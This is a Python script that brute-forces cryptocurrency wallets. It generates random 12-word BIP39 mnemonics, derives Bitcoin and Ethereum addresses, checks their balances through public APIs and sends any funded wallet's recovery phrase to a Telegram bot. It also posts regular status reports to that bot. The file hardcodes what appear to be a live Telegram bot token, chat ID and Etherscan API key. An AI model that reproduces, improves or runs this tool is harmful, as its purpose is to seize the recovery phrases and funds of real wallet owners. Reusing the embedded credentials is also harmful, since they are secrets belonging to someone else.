import requests
import time
import threading
import random
import string
import asyncio
import aiohttp
from bip_utils import Bip39MnemonicGenerator, Bip39SeedGenerator, Bip44, Bip44Coins
from eth_account import Account
from bitcoinaddress import Wallet

# Telegram Bot Config
TELEGRAM_BOT_TOKEN = "6600045884:AAHCVIaUjbi9a0GbiQpcOEJcpxK-g0iqQsU"
TELEGRAM_CHAT_ID = "737206288"

# API Keys for balance checks
ETHERSCAN_API_KEY = "75722298119549be9f2e368591eb0a7b"

# Global count
total_generations = 0
found_wallets = 0
lock = threading.Lock()

def generate_wallet():
    """Generate a BTC and ETH wallet from a 12-word mnemonic."""
    global total_generations, found_wallets
    while True:
        try:
            mnemonic = Bip39MnemonicGenerator().FromWordsNumber(12)
            seed = Bip39SeedGenerator(mnemonic).Generate()
            
            # Bitcoin Address
            bip44_mst_ctx = Bip44.FromSeed(seed, Bip44Coins.BITCOIN)
            bip44_acc_ctx = bip44_mst_ctx.Purpose().Coin().Account(0).Change(0).AddressIndex(0)
            btc_address = bip44_acc_ctx.PublicKey().ToAddress()
            
            # Ethereum Address
            acct = Account.from_mnemonic(mnemonic)
            eth_address = acct.address
            
            # Check balances
            btc_balance = check_btc_balance(btc_address)
            eth_balance = check_eth_balance(eth_address)
            
            # Update generation count
            with lock:
                total_generations += 1
                
            # If balance found, send to Telegram
            if btc_balance > 1e-9 or eth_balance > 1e-9:
                with lock:
                    found_wallets += 1
                send_to_telegram(mnemonic, btc_address, btc_balance, eth_address, eth_balance)
        
        except Exception as e:
            print(f"Error in wallet generation: {e}")
        
        time.sleep(0.1)  # Reduce CPU usage

def check_btc_balance(address):
    """Check Bitcoin balance using Blockchair API."""
    url = f"https://api.blockchair.com/bitcoin/dashboards/address/{address}"
    try:
        response = requests.get(url).json()
        return response['data'][address]['address']['balance'] / 1e8
    except:
        return 0

def check_eth_balance(address):
    """Check Ethereum balance using Etherscan API."""
    url = f"https://api.etherscan.io/api?module=account&action=balance&address={address}&tag=latest&apikey={ETHERSCAN_API_KEY}"
    try:
        response = requests.get(url).json()
        return int(response['result']) / 1e18
    except:
        return 0

def send_to_telegram(mnemonic, btc_address, btc_balance, eth_address, eth_balance):
    """Send wallet details to Telegram."""
    message = (f"🔥 Found Wallet!\n\n"
               f"Mnemonic: {mnemonic}\n"
               f"BTC Address: {btc_address}\nBalance: {btc_balance} BTC\n\n"
               f"ETH Address: {eth_address}\nBalance: {eth_balance} ETH")
    requests.post(f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage",
                  data={"chat_id": TELEGRAM_CHAT_ID, "text": message})

def report_status():
    """Report total generations every 5 minutes."""
    while True:
        message = f"🔹 Total Generations: {total_generations}\n🔹 Wallets Found: {found_wallets}"
        requests.post(f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage",
                      data={"chat_id": TELEGRAM_CHAT_ID, "text": message})
        time.sleep(300)

def main():
    """Start multi-threaded wallet generation."""
    num_threads = 4  # Adjust based on CPU cores
    threads = [threading.Thread(target=generate_wallet, daemon=True) for _ in range(num_threads)]
    
    for thread in threads:
        thread.start()
    
    report_status()  # Start reporting

if __name__ == "__main__":
    main()
